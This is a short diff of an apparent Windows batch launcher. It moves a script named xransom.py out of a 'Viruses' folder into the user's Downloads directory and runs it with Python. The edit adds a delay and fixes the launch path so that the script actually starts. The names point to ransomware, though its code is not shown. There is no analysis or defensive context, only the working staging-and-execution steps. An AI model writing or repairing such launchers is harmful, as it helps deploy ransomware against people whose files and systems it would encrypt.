@@ -9,5 +9,6 @@ timeout 1 > nul
 set source="C:\Users\nassi\Downloads\Viruses\xransom\xransom.py"
 set destination="%USERPROFILE%\Downloads"
 move %source% %destination%
-python "C:\Users\%USERPROFILE%\Downloads\xransom.py"
+timeout 1 > nul
+python "C:\Users\%USERNAME%\Downloads\xransom.py"
 exit
